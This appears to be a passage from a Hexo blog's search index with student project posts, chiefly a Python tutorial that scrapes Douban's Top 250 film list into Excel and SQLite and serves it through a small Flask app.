<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>一个纯纯手打的网页设计</title>
      <link href="/2022/01/11/%E4%B8%80%E4%B8%AA%E7%BA%AF%E7%BA%AF%E6%89%8B%E6%89%93%E7%9A%84%E7%BD%91%E9%A1%B5%E8%AE%BE%E8%AE%A1/"/>
      <url>/2022/01/11/%E4%B8%80%E4%B8%AA%E7%BA%AF%E7%BA%AF%E6%89%8B%E6%89%93%E7%9A%84%E7%BD%91%E9%A1%B5%E8%AE%BE%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h1><blockquote><p>大一做的课设有点花里胡哨，但是功能包括了banner图、菜单栏、ppt加图片滚动，由于文件丢失了，所以放了另一个也是纯手打（没有用框架）的网页，比较普通，大一的作品，望见谅。。。</p></blockquote><blockquote><p>ps：源代码放在最后</p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>选课系统（数据库实验）</title>
      <link href="/2022/01/11/%E9%80%89%E8%AF%BE%E7%B3%BB%E7%BB%9F%EF%BC%88%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%9E%E9%AA%8C%EF%BC%89/"/>
      <url>/2022/01/11/%E9%80%89%E8%AF%BE%E7%B3%BB%E7%BB%9F%EF%BC%88%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%9E%E9%AA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>一些爬虫ing</title>
      <link href="/2022/01/10/%E4%B8%80%E4%BA%9B%E7%88%AC%E8%99%AB/"/>
      <url>/2022/01/10/%E4%B8%80%E4%BA%9B%E7%88%AC%E8%99%AB/</url>
      
        <content type="html"><![CDATA[<h1 id="一些爬虫"><a href="#一些爬虫" class="headerlink" title="一些爬虫"></a>一些爬虫</h1><blockquote><p>说明：一共爬了三个网站，分别是豆瓣TOP250、51job、xssed网站漏洞信息，其中爬取豆瓣时使用的方法是BeautifulSoup，有可视化分析，后两个使用的方法是xpath，无可视化</p><p>软件：JetBrains PyCharm 2019.2.5</p><p>语言：python 3.8.5 </p></blockquote><p>在说明具体过程之前，先了解一些需要用到的python模块：</p><ul><li><code>import sys</code>：提供对解释器使用或维护的一些变量的访问，以及与解释器强烈交互的函数</li><li><code>from bs4 import BeautifulSoup</code>：页面解析，获取数据</li><li><code>import re</code>：正则表达式，进行文字匹配</li><li><code>import urllib.request</code>, <code>urllib.error</code>：指定URL，获取网页数据</li><li><code>import xlwt</code>：进行excel操作</li><li><code>import sqlite3</code>：进行SQLLi</li><li><code>import json</code> ：一种轻量级的数据交换格式</li><li><code>from lxml import etree</code>：用来解析XML字符串</li></ul><p><em>每次调用这些模块的时候都需要先引用，有一点抽象，等用到具体函数的时候再进一步解释</em></p><h2 id="爬取豆瓣TOP250"><a href="#爬取豆瓣TOP250" class="headerlink" title="爬取豆瓣TOP250"></a>爬取豆瓣TOP250</h2><p>爬取网页的过程分成三大步：</p><ol><li>爬取网页</li><li>解析数据</li><li>保存数据</li></ol><p>具体代码：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- codeing = utf-8 -*-</span><span class="token comment" spellcheck="true"># @Time " 2020/9/29 9:42</span><span class="token comment" spellcheck="true"># @Author : young</span><span class="token comment" spellcheck="true"># @File " spider.py</span><span class="token comment" spellcheck="true"># @Software " PyCharm</span><span class="token keyword">import</span> sys<span class="token keyword">from</span> bs4 <span class="token keyword">import</span> BeautifulSoup  <span class="token comment" spellcheck="true"># 页面解析，获取数据</span><span class="token keyword">import</span> re  <span class="token comment" spellcheck="true"># 正则表达式，进行文字匹配</span><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">,</span> urllib<span class="token punctuation">.</span>error  <span class="token comment" spellcheck="true"># 指定URL，获取网页数据</span><span class="token keyword">import</span> xlwt  <span class="token comment" spellcheck="true"># 进行excel操作</span><span class="token keyword">import</span> sqlite3  <span class="token comment" spellcheck="true"># 进行SQLLi</span><span class="token comment" spellcheck="true"># 1.爬取网页</span><span class="token comment" spellcheck="true"># 2.解析数据</span><span class="token comment" spellcheck="true"># 3.保存数据</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    baseurl <span class="token operator">=</span> <span class="token string">"https://movie.douban.com/top250?start="</span>    <span class="token comment" spellcheck="true"># 1.爬取网页</span>    datalist <span class="token operator">=</span> getData<span class="token punctuation">(</span>baseurl<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># 3.保存数据</span>    <span class="token comment" spellcheck="true"># savepath = ".\\豆瓣电影TOP250.xls"</span>    dbpath <span class="token operator">=</span> <span class="token string">"movie.db"</span>    <span class="token comment" spellcheck="true"># saveData(datalist,savepath)</span>    <span class="token comment" spellcheck="true"># askURL(baseurl)</span>    saveData2DB<span class="token punctuation">(</span>datalist<span class="token punctuation">,</span>dbpath<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 影片详情链接的规则</span>findLink <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'&lt;a href="(.*?)">'</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 创建正则表达式对象，表示规则（字符串模式）</span><span class="token comment" spellcheck="true"># 影片图片</span>findImgSrc <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'&lt;img.* scr="(.*?)">'</span><span class="token punctuation">,</span> re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># re.S：让换行符包括在字符中</span><span class="token comment" spellcheck="true"># 影片片名</span>findTitle <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'&lt;span class="title">(.*)&lt;/span>'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 影片评分</span>findRating <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'&lt;span class="rating_num" property="v:average">(.*)&lt;/span>'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 评价人数</span>findJudge <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'&lt;span>(\d*)人评价&lt;/span>'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 找到概况</span>findInq <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'&lt;span class="inq">(.*)&lt;/span>'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 找到影片的相关内容</span>findBd <span class="token operator">=</span> re<span class="token punctuation">.</span>compile<span class="token punctuation">(</span>r<span class="token string">'&lt;p class="">(.*?)&lt;/p>'</span><span class="token punctuation">,</span> re<span class="token punctuation">.</span>S<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 爬取网页</span><span class="token keyword">def</span> <span class="token function">getData</span><span class="token punctuation">(</span>baseurl<span class="token punctuation">)</span><span class="token punctuation">:</span>    datalist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># 调用获取页面信息的函数·10次</span>        url <span class="token operator">=</span> baseurl <span class="token operator">+</span> str<span class="token punctuation">(</span>i <span class="token operator">*</span> <span class="token number">25</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># 每翻一页增加25</span>        html <span class="token operator">=</span> askURL<span class="token punctuation">(</span>url<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 保存获取到的网页源码</span>        <span class="token comment" spellcheck="true"># 2.逐一解析数据</span>        soup <span class="token operator">=</span> BeautifulSoup<span class="token punctuation">(</span>html<span class="token punctuation">,</span> <span class="token string">"html.parser"</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># 指定解析器，可以识别html中的标签</span>        <span class="token keyword">for</span> item <span class="token keyword">in</span> soup<span class="token punctuation">.</span>find_all<span class="token punctuation">(</span><span class="token string">'div'</span><span class="token punctuation">,</span> class_<span class="token operator">=</span><span class="token string">"item"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># 类别的属性要加下划线，查找符合要求的字符串，形成列表</span>            <span class="token comment" spellcheck="true"># print(item)        #测试：查看电影item全部信息</span>            data <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true"># 保存一部电影的所有信息</span>            item <span class="token operator">=</span> str<span class="token punctuation">(</span>item<span class="token punctuation">)</span>            <span class="token comment" spellcheck="true"># 影片详情的链接</span>            link <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>findLink<span class="token punctuation">,</span> item<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true"># re库用来通过正则表达式查找指定的字符串</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>link<span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># 添加链接</span>            imgSrc <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>findImgSrc<span class="token punctuation">,</span>item<span class="token punctuation">)</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>imgSrc<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 添加图片</span>            titles <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>findTitle<span class="token punctuation">,</span> item<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 片名可能只有一个中文名，没有外国名</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>len<span class="token punctuation">(</span>titles<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                ctitle <span class="token operator">=</span> titles<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>  <span class="token comment" spellcheck="true"># 添加中文名</span>                data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>ctitle<span class="token punctuation">)</span>                otitle <span class="token operator">=</span> titles<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 去掉无关的符号</span>                data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>otitle<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 添加外国名</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>titles<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>                data<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 外国名留空</span>            rating <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>findRating<span class="token punctuation">,</span> item<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>rating<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 添加评分</span>            judgeNum <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>findJudge<span class="token punctuation">,</span> item<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>judgeNum<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 添加概述</span>            inq <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>findInq<span class="token punctuation">,</span> item<span class="token punctuation">)</span>            <span class="token keyword">if</span> len<span class="token punctuation">(</span>inq<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>                inq <span class="token operator">=</span> inq<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"。"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 去掉句号</span>                data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>inq<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 添加概述</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                data<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string">"  "</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 留空</span>            bd <span class="token operator">=</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>findBd<span class="token punctuation">,</span> item<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>            bd <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">'&lt;br(\s+)?/>(\s+)?'</span><span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">,</span> bd<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 去掉&lt;br/></span>            bd <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">,</span> bd<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 替换/</span>            data<span class="token punctuation">.</span>append<span class="token punctuation">(</span>bd<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 去掉前后的空格</span>            datalist<span class="token punctuation">.</span>append<span class="token punctuation">(</span>data<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 把处理好的一部电影信息收入datalist</span>            <span class="token comment" spellcheck="true">#print(datalist)        #测试获取正在爬取的一部影片信息</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"正在爬取第%d页的数据"</span><span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#print(datalist)                #测试获取爬取的全部影片信息</span>    <span class="token keyword">return</span> datalist<span class="token comment" spellcheck="true"># 得到指定一个URL的网页内容</span><span class="token keyword">def</span> <span class="token function">askURL</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    head <span class="token operator">=</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true"># 模拟浏览器头部信息，向豆瓣服务器发送消息</span>        <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36"</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true"># 用户代理，标识告诉豆瓣服务器，我们是什么类型的机器，浏览器（本质上是告诉浏览器，我们可以接受什么水平的内容）</span>    <span class="token comment" spellcheck="true"># user-agent可以从浏览器开发者调试工具（F12）中的network中找</span>    request <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>head<span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># 构造请求</span>    html <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># 使用try，发生异常时不会终止程序</span>        response <span class="token operator">=</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>request<span class="token punctuation">)</span>        html <span class="token operator">=</span> response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># print(html)               # 测试获取的页面</span>    <span class="token keyword">except</span> urllib<span class="token punctuation">.</span>error<span class="token punctuation">.</span>URLError <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">if</span> hasattr<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token string">"code"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token comment" spellcheck="true">#如果对象e中有属性code则返回true</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>code<span class="token punctuation">)</span>        <span class="token keyword">if</span> hasattr<span class="token punctuation">(</span>e<span class="token punctuation">,</span> <span class="token string">"reason"</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true">#如果对象e中有属性reason则返回true</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span>reason<span class="token punctuation">)</span>    <span class="token keyword">return</span> html<span class="token triple-quoted-string string">'''# 3.保存数据def saveData(savepath):'''</span><span class="token keyword">def</span> <span class="token function">saveData</span><span class="token punctuation">(</span>datalist<span class="token punctuation">,</span>savepath<span class="token punctuation">)</span><span class="token punctuation">:</span>    book <span class="token operator">=</span> xlwt<span class="token punctuation">.</span>Workbook<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 创建workbook对象</span>    sheet <span class="token operator">=</span> book<span class="token punctuation">.</span>add_sheet<span class="token punctuation">(</span><span class="token string">'豆瓣电影TOP250'</span><span class="token punctuation">,</span>cell_overwrite_ok<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 创建工作表</span>    col <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'电影详情链接'</span><span class="token punctuation">,</span><span class="token string">"图片链接"</span><span class="token punctuation">,</span><span class="token string">"影片中文名"</span><span class="token punctuation">,</span><span class="token string">"影片外国名"</span><span class="token punctuation">,</span><span class="token string">"评分"</span><span class="token punctuation">,</span><span class="token string">"评份数"</span><span class="token punctuation">,</span><span class="token string">"概况"</span><span class="token punctuation">,</span><span class="token string">"相关信息"</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        sheet<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span>i<span class="token punctuation">,</span>col<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#列名</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">250</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"第%d条"</span><span class="token operator">%</span>i<span class="token punctuation">)</span>        data <span class="token operator">=</span> datalist<span class="token punctuation">[</span>i<span class="token punctuation">]</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            sheet<span class="token punctuation">.</span>write<span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>j<span class="token punctuation">,</span>data<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">#数据</span>    book<span class="token punctuation">.</span>save<span class="token punctuation">(</span>savepath<span class="token punctuation">)</span>              <span class="token comment" spellcheck="true"># 保存数据表</span><span class="token keyword">def</span> <span class="token function">saveData2DB</span><span class="token punctuation">(</span>datalist<span class="token punctuation">,</span>dbpath<span class="token punctuation">)</span><span class="token punctuation">:</span>    init_db<span class="token punctuation">(</span>dbpath<span class="token punctuation">)</span>    conn <span class="token operator">=</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>dbpath<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">#建立数据库连接</span>    cur <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>             <span class="token comment" spellcheck="true">#获取游标</span>    <span class="token keyword">for</span> data <span class="token keyword">in</span> datalist<span class="token punctuation">:</span>        <span class="token keyword">for</span> index <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># print(index)</span>            <span class="token keyword">if</span> index <span class="token operator">==</span> <span class="token number">4</span> <span class="token operator">or</span> index <span class="token operator">==</span> <span class="token number">5</span><span class="token punctuation">:</span>                <span class="token keyword">continue</span>            data<span class="token punctuation">[</span>index<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'"'</span><span class="token operator">+</span>str<span class="token punctuation">(</span>data<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'"'</span>        sql <span class="token operator">=</span> <span class="token triple-quoted-string string">'''                insert into movie250(                info_link,pic_link,cname,ename,score,rated,instroduction,info)                values(%s);'''</span><span class="token operator">%</span><span class="token string">","</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token string">'%s'</span> <span class="token operator">%</span>id <span class="token keyword">for</span> id <span class="token keyword">in</span> data<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#data里的列表每一个都用逗号连接起来</span>        <span class="token comment" spellcheck="true"># print(sql)</span>        cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>        conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>           <span class="token comment" spellcheck="true">#提交数据库操作</span>    cur<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>                <span class="token comment" spellcheck="true">#关闭数据库连接</span><span class="token keyword">def</span> <span class="token function">init_db</span><span class="token punctuation">(</span>dbpath<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># 创建数据库</span>    sql <span class="token operator">=</span> <span class="token triple-quoted-string string">'''        create table movie250        (        id integer primary key autoincrement,        info_link text,        pic_link text,        cname varchar ,        ename varchar ,        score numeric ,        rated numeric ,        instroduction text,        info text        );    '''</span>    <span class="token comment" spellcheck="true">#创建数据表</span>    conn <span class="token operator">=</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>dbpath<span class="token punctuation">)</span>    cursor <span class="token operator">=</span> conn<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    cursor<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>     <span class="token comment" spellcheck="true"># 执行</span>    conn<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>           <span class="token comment" spellcheck="true"># 事务提交，否则数据库得不到更新</span>    conn<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>  <span class="token comment" spellcheck="true"># 当程序执行时</span>    <span class="token comment" spellcheck="true"># 调用函数</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"爬取完毕！"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结果：<br><img src="https://tremiy.github.io/2022/01/10/%E4%B8%80%E4%BA%9B%E7%88%AC%E8%99%AB/2.png" alt="部分结果截图"></p><h3 id="可视化操作："><a href="#可视化操作：" class="headerlink" title="可视化操作："></a>可视化操作：</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>render_template<span class="token keyword">import</span> sqlite3app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"index.html"</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/index'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">home</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># return render_template("index.html")</span>    <span class="token keyword">return</span> index<span class="token punctuation">(</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/movie'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">movie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    datalist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    con <span class="token operator">=</span> sqlite3<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token string">"movie.db"</span><span class="token punctuation">)</span>    cur <span class="token operator">=</span> con<span class="token punctuation">.</span>cursor<span class="token punctuation">(</span><span class="token punctuation">)</span>    sql <span class="token operator">=</span> <span class="token string">"select * from movie250"</span>    data <span class="token operator">=</span> cur<span class="token punctuation">.</span>execute<span class="token punctuation">(</span>sql<span class="token punctuation">)</span>    <span class="token keyword">for</span> item <span class="token keyword">in</span> data<span class="token punctuation">:</span>        datalist<span class="token punctuation">.</span>append<span class="token punctuation">(</span>item<span class="token punctuation">)</span>    cur<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    con<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"movie.html"</span><span class="token punctuation">,</span>movies <span class="token operator">=</span> datalist<span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/score'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">score</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"score.html"</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/word'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">word</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"word.html"</span><span class="token punctuation">)</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/team'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">team</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">"team.html"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" 